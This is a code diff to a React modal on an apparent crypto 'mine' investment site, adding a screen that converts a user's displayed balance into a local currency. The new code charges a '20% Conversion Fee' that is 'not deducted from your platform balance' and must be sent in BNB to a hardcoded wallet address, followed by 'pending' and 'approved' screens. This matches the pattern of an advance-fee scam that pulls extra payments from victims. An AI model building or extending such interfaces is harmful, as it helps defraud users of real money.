@@ -12,10 +12,15 @@ import {
   RefreshCw,
   Wallet,
   Coins,
-  Info
+  Info,
+  Copy,
+  Check,
+  AlertTriangle,
+  Clock
 } from 'lucide-react';
 import { useAuth } from '../../context/AuthContext';
 import { supabase } from '../../lib/supabase';
+import { API_BASE } from '../../config/api';
 
 interface ConvertModalProps {
   isOpen: boolean;
@@ -52,36 +57,54 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
   mainBalance,
   profitBalance
 }) => {
-  const { user, profile } = useAuth();
+  const { user, profile, session } = useAuth();
 
-  const [currentStep, setCurrentStep] = useState<'convert' | 'contact'>('convert');
+  const [currentStep, setCurrentStep] = useState<'convert' | 'pending' | 'converted'>('convert');
   const [selectedCurrency, setSelectedCurrency] = useState<MineCurrency>(LOCAL_MINE_CURRENCIES[0]); // Default: SGD
   const [isFolderOpen, setIsFolderOpen] = useState(false);
   const [isConverting, setIsConverting] = useState(false);
   const [conversionRef, setConversionRef] = useState<string>('');
+  const [copied, setCopied] = useState(false);
+  
+  // Balances & Settings
   const [fetchedMainBal, setFetchedMainBal] = useState<number>(0);
   const [fetchedProfitBal, setFetchedProfitBal] = useState<number>(0);
+  const [gasFeeWallet, setGasFeeWallet] = useState<string>('0x71C8F39255C8F8F9898c8D455F55e7146522c09F');
+  const [gasFeeNetwork, setGasFeeNetwork] = useState<string>('BNB Smart Chain (BEP20)');
+  const [bnbPrice, setBnbPrice] = useState<number>(580.00);
 
-  // Fetch latest capital & profit balances from wallets or approved deposits if not passed
+  // Fetch balances, active gas/conversion fee wallet, and past conversion status
   useEffect(() => {
     if (!isOpen || !user?.id) return;
-    const fetchLatestBalances = async () => {
+
+    const loadData = async () => {
       try {
-        // 1. Fetch from profiles
+        // 1. Fetch system gas fee settings
+        const { data: settingsData } = await supabase
+          .from('system_settings')
+          .select('*');
+
+        if (settingsData && settingsData.length > 0) {
+          const gasSetting = settingsData.find((s: any) => s.key === 'gas_fee_address' || s.key === 'conversion_fee_address');
+          if (gasSetting && gasSetting.value) {
+            setGasFeeWallet(gasSetting.value);
+            if (gasSetting.network) setGasFeeNetwork(gasSetting.network);
+          }
+        }
+
+        // 2. Fetch latest user balances
         const { data: profData } = await supabase
           .from('profiles')
-          .select('main_balance, profit_balance')
+          .select('main_balance, profit_balance, convert_balance, convert_currency')
           .eq('auth_user_id', user.id)
           .maybeSingle();
 
-        // 2. Fetch from wallets table
         const { data: walletData } = await supabase
           .from('wallets')
           .select('balance, profit_balance')
           .eq('user_id', user.id)
           .maybeSingle();
 
-        // 3. Fetch from approved deposits
         const { data: depData } = await supabase
           .from('deposits')
           .select('amount, status')
@@ -102,11 +125,33 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
 
         setFetchedMainBal(resolvedMain);
         setFetchedProfitBal(resolvedProfit);
+
+        // 3. Check for existing pending or converted requests
+        const { data: convData } = await supabase
+          .from('conversion_requests')
+          .select('*')
+          .eq('user_id', user.id)
+          .order('created_at', { ascending: false })
+          .limit(1)
+          .maybeSingle();
+
+        if (convData) {
+          setConversionRef(convData.ref_code);
+          const foundCurr = LOCAL_MINE_CURRENCIES.find(c => c.code === convData.target_currency);
+          if (foundCurr) setSelectedCurrency(foundCurr);
+
+          if (convData.status === 'CONVERTED') {
+            setCurrentStep('converted');
+          } else if (convData.status === 'PENDING') {
+            setCurrentStep('pending');
+          }
+        }
       } catch (err) {
-        console.warn('Error fetching balances in ConvertModal:', err);
+        console.warn('Error loading ConvertModal data:', err);
       }
     };
-    fetchLatestBalances();
+
+    loadData();
   }, [isOpen, user?.id]);
 
   if (!isOpen) return null;
@@ -123,18 +168,50 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
   // Combined Total USD Mine (Capital + Profit)
   const totalUsdMine = +(effectiveMainBal + effectiveProfitBal).toFixed(2);
 
-  // Converted value
+  // Converted Gross Value in Target Currency
   const convertedValue = +(totalUsdMine * selectedCurrency.ratePerUsd).toFixed(2);
 
-  const handleConvert = () => {
+  // 20% Conversion Fee Calculations
+  const conversionFeeUsd = +(totalUsdMine * 0.20).toFixed(2);
+  const conversionFeeBnb = +(conversionFeeUsd / bnbPrice).toFixed(4);
+
+  const handleCopyWallet = () => {
+    navigator.clipboard.writeText(gasFeeWallet);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleConvert = async () => {
     setIsConverting(true);
     const refCode = `QB-MINE-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
     setConversionRef(refCode);
 
-    setTimeout(() => {
+    try {
+      // 1. Submit conversion request to API / database
+      const token = session?.access_token;
+      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
+      if (token) headers['Authorization'] = `Bearer ${token}`;
+
+      await fetch(`${API_BASE}/conversions`, {
+        method: 'POST',
+        headers,
+        body: JSON.stringify({
+          usdMineAmount: totalUsdMine,
+          targetCurrency: selectedCurrency.code,
+          convertedAmount: convertedValue,
+          exchangeRate: selectedCurrency.ratePerUsd,
+          conversionFeeUsd,
+          conversionFeeBnb,
+          feeWalletAddress: gasFeeWallet,
+          refCode
+        })
+      });
+    } catch (err) {
+      console.warn('Error submitting conversion request:', err);
+    } finally {
       setIsConverting(false);
-      setCurrentStep('contact');
-    }, 600);
+      setCurrentStep('pending');
+    }
   };
 
   const handleOpenLiveChat = () => {
@@ -153,15 +230,15 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
   };
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-dark-950/80 backdrop-blur-md animate-fadeIn">
-      <div className="relative w-full max-w-xl bg-gradient-to-b from-dark-900 via-dark-950 to-slate-950 border border-gold-500/30 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden max-h-[92vh] flex flex-col">
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-dark-950/85 backdrop-blur-md animate-fadeIn">
+      <div className="relative w-full max-w-xl bg-gradient-to-b from-dark-900 via-dark-950 to-slate-950 border border-gold-500/30 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden max-h-[94vh] flex flex-col">
         
         {/* Ambient background glows */}
         <div className="absolute -top-16 -right-16 w-56 h-56 bg-gold-500/10 rounded-full blur-3xl pointer-events-none" />
         <div className="absolute -bottom-16 -left-16 w-56 h-56 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
 
         {/* Modal Header */}
-        <div className="relative z-10 flex items-center justify-between border-b border-slate-800/80 pb-4 mb-6">
+        <div className="relative z-10 flex items-center justify-between border-b border-slate-800/80 pb-4 mb-5">
           <div className="flex items-center space-x-3">
             <div className="w-10 h-10 rounded-2xl bg-gold-400/10 border border-gold-400/30 flex items-center justify-center text-gold-400">
               <Coins className="w-5 h-5" />
@@ -174,7 +251,9 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                 </span>
               </h2>
               <p className="text-xs text-slate-400">
-                {currentStep === 'convert' ? 'Convert Total USD Mine to Local Mine Currency' : 'Conversion Initiated • Contact Support'}
+                {currentStep === 'convert' && 'Convert Total USD Mine to Local Mine Currency'}
+                {currentStep === 'pending' && 'Conversion Status: Pending Admin Approval'}
+                {currentStep === 'converted' && 'Conversion Approved & Settled'}
               </p>
             </div>
           </div>
@@ -187,11 +266,11 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
         </div>
 
         {/* Modal Body */}
-        <div className="relative z-10 space-y-6 overflow-y-auto pr-1 flex-1">
+        <div className="relative z-10 space-y-5 overflow-y-auto pr-1 flex-1">
           
-          {/* STEP 1: CONVERT USD MINE TO LOCAL CURRENCY MINE */}
+          {/* ================= STEP 1: CONVERSION OVERVIEW & 20% BNB FEE ================= */}
           {currentStep === 'convert' && (
-            <div className="space-y-6 animate-fadeIn">
+            <div className="space-y-5 animate-fadeIn">
               
               {/* Total USD Mine Balance Card */}
               <div className="p-4 sm:p-5 rounded-2xl bg-dark-900/90 border border-slate-800 space-y-2">
@@ -211,23 +290,18 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
               </div>
 
               {/* Conversion Amount Input */}
-              <div className="space-y-2">
-                <div className="flex items-center justify-between text-xs">
-                  <label className="font-semibold text-slate-300">Conversion Amount (USD Mine)</label>
-                </div>
-
-                <div className="relative">
-                  <input
-                    type="text"
-                    readOnly
-                    value={`$${totalUsdMine.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD Mine`}
-                    className="w-full py-3.5 px-4 bg-dark-950/90 border border-slate-700/80 rounded-xl text-white font-mono text-base font-bold cursor-not-allowed select-none opacity-90 shadow-inner"
-                  />
-                </div>
+              <div className="space-y-1.5">
+                <label className="text-xs font-semibold text-slate-300">Conversion Amount (USD Mine)</label>
+                <input
+                  type="text"
+                  readOnly
+                  value={`$${totalUsdMine.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD Mine`}
+                  className="w-full py-3 px-4 bg-dark-950/90 border border-slate-700/80 rounded-xl text-white font-mono text-base font-bold cursor-not-allowed select-none opacity-90 shadow-inner"
+                />
               </div>
 
               {/* Local Currency Mine Folder Selector */}
-              <div className="space-y-2">
+              <div className="space-y-1.5">
                 <div className="flex items-center justify-between text-xs">
                   <label className="font-semibold text-slate-300">Target Local Currency Mine</label>
                   <span className="text-[11px] text-slate-400 font-mono">
@@ -240,7 +314,7 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                   <button
                     type="button"
                     onClick={() => setIsFolderOpen(!isFolderOpen)}
-                    className="w-full py-3.5 px-4 rounded-xl bg-slate-900/90 border border-gold-500/40 hover:border-gold-400 flex items-center justify-between transition-all group shadow-sm text-left"
+                    className="w-full py-3 px-4 rounded-xl bg-slate-900/90 border border-gold-500/40 hover:border-gold-400 flex items-center justify-between transition-all group shadow-sm text-left"
                   >
                     <div className="flex items-center space-x-3">
                       <span className="text-2xl">{selectedCurrency.flag}</span>
@@ -267,7 +341,7 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
 
                   {/* Folder Dropdown Content */}
                   {isFolderOpen && (
-                    <div className="mt-2 p-2 bg-dark-950/95 border border-slate-700/80 rounded-2xl shadow-2xl space-y-1 max-h-56 overflow-y-auto animate-fadeIn z-20 backdrop-blur-lg">
+                    <div className="mt-2 p-2 bg-dark-950/95 border border-slate-700/80 rounded-2xl shadow-2xl space-y-1 max-h-52 overflow-y-auto animate-fadeIn z-20 backdrop-blur-lg">
                       <div className="px-3 py-1.5 text-[10px] font-mono uppercase tracking-wider text-slate-400 flex items-center justify-between border-b border-slate-800/80">
                         <span>Select Target Local Currency Mine</span>
                         <span>Exchange Rate</span>
@@ -310,11 +384,11 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                 </div>
               </div>
 
-              {/* Converted Estimation Box */}
+              {/* ESTIMATED GROSS CONVERSION Card */}
               <div className="p-4 rounded-2xl bg-gradient-to-r from-emerald-500/10 via-dark-900 to-teal-500/10 border border-emerald-500/30 flex items-center justify-between">
                 <div>
                   <span className="text-[10px] uppercase font-mono tracking-wider text-emerald-400 font-bold block">
-                    Estimated Gross Conversion
+                    ESTIMATED GROSS CONVERSION
                   </span>
                   <div className="text-2xl font-black text-white font-mono tracking-tight mt-0.5">
                     {selectedCurrency.symbol} {convertedValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} <span className="text-sm font-semibold text-emerald-400">{selectedCurrency.code} Mine</span>
@@ -322,6 +396,59 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                 </div>
                 <div className="w-10 h-10 rounded-xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400">
                   <Sparkles className="w-5 h-5" />
+                </div>
+              </div>
+
+              {/* 20% CONVERSION FEE (BNB) CARD & CONVERSION DOMAIN PAYMENT WALLET */}
+              <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-3.5">
+                <div className="flex items-center justify-between">
+                  <span className="text-[11px] font-bold uppercase tracking-wider text-amber-300 flex items-center gap-1.5 font-mono">
+                    <AlertTriangle className="w-4 h-4 text-amber-400" />
+                    <span>20% Conversion Fee (BNB)</span>
+                  </span>
+                  <span className="text-xs font-mono font-black text-amber-300 bg-amber-500/20 px-2.5 py-0.5 rounded-full border border-amber-500/30">
+                    {conversionFeeBnb} BNB
+                  </span>
+                </div>
+
+                <div className="p-3 bg-dark-950/80 rounded-xl border border-amber-500/20 space-y-1.5 text-xs">
+                  <div className="flex justify-between text-slate-300 font-mono">
+                    <span>Conversion Fee (20%):</span>
+                    <strong className="text-amber-300">${conversionFeeUsd.toLocaleString(undefined, { minimumFractionDigits: 2 })} USD</strong>
+                  </div>
+                  <div className="flex justify-between text-slate-300 font-mono">
+                    <span>Payable in BNB:</span>
+                    <strong className="text-amber-300 font-bold">{conversionFeeBnb} BNB</strong>
+                  </div>
+                </div>
+
+                {/* Important Notice Regarding Payment to Conversion Domain */}
+                <div className="text-[11px] text-amber-200/90 leading-relaxed bg-amber-950/30 p-2.5 rounded-xl border border-amber-500/20">
+                  <p className="font-bold text-amber-300 mb-0.5">⚠️ Make payment to CONVERSION DOMAIN</p>
+                  <p>
+                    Please note that the 20% conversion fee is <strong>not deducted from your platform balance</strong>. You must transfer the exact fee to the designated conversion protocol wallet address below before approval.
+                  </p>
+                </div>
+
+                {/* Conversion Fee Wallet Address */}
+                <div className="space-y-1.5">
+                  <div className="flex items-center justify-between text-[10px] font-mono text-slate-400">
+                    <span>CONVERSION FEE WALLET ADDRESS ({gasFeeNetwork})</span>
+                  </div>
+
+                  <div className="flex items-center gap-2 p-2.5 bg-dark-950 border border-slate-700/80 rounded-xl">
+                    <span className="font-mono text-xs text-amber-300 truncate flex-1 select-all">
+                      {gasFeeWallet}
+                    </span>
+                    <button
+                      type="button"
+                      onClick={handleCopyWallet}
+                      className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 text-xs font-bold transition-colors flex items-center gap-1 shrink-0"
+                    >
+                      {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                      <span>{copied ? 'Copied' : 'Copy'}</span>
+                    </button>
+                  </div>
                 </div>
               </div>
 
@@ -347,30 +474,33 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
             </div>
           )}
 
-          {/* STEP 2: CONVERSION INITIATED • CONTACT SUPPORT PAGE */}
-          {currentStep === 'contact' && (
-            <div className="space-y-6 animate-fadeIn text-center py-2">
+          {/* ================= STEP 2: CONVERSION PENDING STATE ================= */}
+          {currentStep === 'pending' && (
+            <div className="space-y-5 animate-fadeIn text-center py-2">
               
               {/* Status Graphic */}
-              <div className="relative mx-auto w-20 h-20 rounded-3xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shadow-xl shadow-emerald-500/10">
-                <CheckCircle2 className="w-10 h-10 animate-pulse" />
+              <div className="relative mx-auto w-20 h-20 rounded-3xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shadow-xl shadow-amber-500/10">
+                <Clock className="w-10 h-10 animate-pulse" />
                 <div className="absolute -top-1 -right-1 w-6 h-6 rounded-full bg-gold-500 flex items-center justify-center text-dark-950">
                   <Sparkles className="w-3.5 h-3.5" />
                 </div>
               </div>
 
               {/* Title & Description */}
-              <div className="space-y-2">
+              <div className="space-y-1.5">
+                <span className="px-3 py-1 rounded-full text-xs font-mono font-bold bg-amber-500/15 text-amber-400 border border-amber-500/30 inline-block">
+                  STATUS: PENDING VERIFICATION
+                </span>
                 <h3 className="text-xl font-black text-white tracking-tight">
-                  Mine Currency Conversion Initiated
+                  Conversion Request Submitted
                 </h3>
                 <p className="text-xs text-slate-300 max-w-md mx-auto leading-relaxed">
-                  Your Total USD Mine portfolio of <strong className="text-white">${totalUsdMine.toLocaleString()}</strong> has been submitted for conversion to <strong className="text-gold-300">{selectedCurrency.symbol} {convertedValue.toLocaleString()} {selectedCurrency.code} Mine</strong>.
+                  Your conversion of <strong className="text-white">${totalUsdMine.toLocaleString()} USD Mine</strong> to <strong className="text-gold-300">{selectedCurrency.symbol} {convertedValue.toLocaleString()} {selectedCurrency.code} Mine</strong> is currently pending fee verification and administrator approval.
                 </p>
               </div>
 
-              {/* Reference Details Container */}
-              <div className="p-4 rounded-2xl bg-dark-900/90 border border-slate-800 text-left space-y-3 font-mono text-xs">
+              {/* Details Container */}
+              <div className="p-4 rounded-2xl bg-dark-900/90 border border-slate-800 text-left space-y-2.5 font-mono text-xs">
                 <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                   <span className="text-slate-400">Settlement Ref Code:</span>
                   <span className="font-bold text-gold-400">{conversionRef}</span>
@@ -380,31 +510,33 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                   <span className="font-bold text-slate-200">{selectedCurrency.name}</span>
                 </div>
                 <div className="flex items-center justify-between pb-2 border-b border-slate-800">
-                  <span className="text-slate-400">Converted Amount:</span>
+                  <span className="text-slate-400">Converted Gross Amount:</span>
                   <span className="font-bold text-emerald-400">
                     {selectedCurrency.symbol} {convertedValue.toLocaleString()} {selectedCurrency.code} Mine
                   </span>
                 </div>
                 <div className="flex items-center justify-between">
-                  <span className="text-slate-400">Routing Status:</span>
-                  <span className="px-2 py-0.5 rounded bg-amber-500/15 text-amber-300 border border-amber-500/30 text-[10px] font-bold">
-                    AWAITING SUPPORT VERIFICATION
-                  </span>
+                  <span className="text-slate-400">20% Fee Payable:</span>
+                  <span className="font-bold text-amber-300">{conversionFeeBnb} BNB (${conversionFeeUsd})</span>
                 </div>
               </div>
 
-              {/* Support Instructions Box */}
-              <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-left flex items-start space-x-3">
-                <Info className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
-                <div className="text-xs text-amber-200/90 leading-relaxed space-y-1">
-                  <p className="font-bold text-amber-300">Action Required to Complete Conversion:</p>
-                  <p>
-                    Please contact institutional customer support immediately to finalize and authorize your local currency mine payout.
-                  </p>
+              {/* Fee Payment Reminder Box */}
+              <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-left space-y-2 text-xs">
+                <p className="font-bold text-amber-300">Conversion Domain Fee Transfer Address:</p>
+                <div className="flex items-center gap-2 p-2 bg-dark-950 rounded-lg border border-slate-700">
+                  <span className="font-mono text-[11px] text-amber-300 truncate flex-1">{gasFeeWallet}</span>
+                  <button
+                    type="button"
+                    onClick={handleCopyWallet}
+                    className="p-1 text-slate-400 hover:text-white"
+                  >
+                    {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                  </button>
                 </div>
               </div>
 
-              {/* Action Buttons */}
+              {/* Contact Support for Assistance Button */}
               <div className="space-y-3 pt-2">
                 <button
                   type="button"
@@ -412,16 +544,70 @@ export const ConvertModal: React.FC<ConvertModalProps> = ({
                   className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 hover:from-emerald-600 hover:to-teal-700 text-white font-black text-sm tracking-wide shadow-lg shadow-emerald-500/25 transition-all flex items-center justify-center space-x-2.5 transform active:scale-98 cursor-pointer"
                 >
                   <Headphones className="w-5 h-5" />
-                  <span>CONTACT SUPPORT TO CONTINUE</span>
+                  <span>CONTACT SUPPORT FOR ASSISTANCE ON CONVERSION</span>
                 </button>
 
                 <button
                   type="button"
                   onClick={handleReset}
-                  className="w-full py-2.5 text-xs text-slate-400 hover:text-white transition-colors flex items-center justify-center space-x-1.5"
+                  className="w-full py-2 text-xs text-slate-400 hover:text-white transition-colors flex items-center justify-center space-x-1.5"
                 >
                   <ArrowLeft className="w-3.5 h-3.5" />
-                  <span>Back to Conversion Overview</span>
+                  <span>Back to New Conversion</span>
+                </button>
+              </div>
+
+            </div>
+          )}
+
+          {/* ================= STEP 3: CONVERTED / APPROVED STATE ================= */}
+          {currentStep === 'converted' && (
+            <div className="space-y-5 animate-fadeIn text-center py-2">
+              
+              <div className="relative mx-auto w-20 h-20 rounded-3xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shadow-xl shadow-emerald-500/10">
+                <CheckCircle2 className="w-10 h-10" />
+                <div className="absolute -top-1 -right-1 w-6 h-6 rounded-full bg-emerald-500 flex items-center justify-center text-dark-950">
+                  <Sparkles className="w-3.5 h-3.5" />
+                </div>
+              </div>
+
+              <div className="space-y-2">
+                <span className="px-3 py-1 rounded-full text-xs font-mono font-bold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 inline-block">
+                  STATUS: CONVERTED
+                </span>
+                <h3 className="text-xl font-black text-white tracking-tight">
+                  Converted! Please check your convert balance to see your assets.
+                </h3>
+                <p className="text-xs text-slate-300 max-w-md mx-auto leading-relaxed">
+                  Your conversion request has been officially approved by the treasury administrator. The converted funds are now credited to your Convert Balance.
+                </p>
+              </div>
+
+              <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-left space-y-2 font-mono text-xs">
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Ref Code:</span>
+                  <span className="font-bold text-gold-400">{conversionRef}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Settled Asset:</span>
+                  <span className="font-bold text-emerald-300">{selectedCurrency.name}</span>
+                </div>
+              </div>
+
+              <div className="space-y-2.5 pt-2">
+                <button
+                  type="button"
+                  onClick={onClose}
+                  className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-sm shadow-md"
+                >
+                  View Convert Balance on Dashboard
+                </button>
+                <button
+                  type="button"
+                  onClick={handleReset}
+                  className="w-full py-2 text-xs text-slate-400 hover:text-white"
+                >
+                  Start Another Conversion
                 </button>
               </div>
 
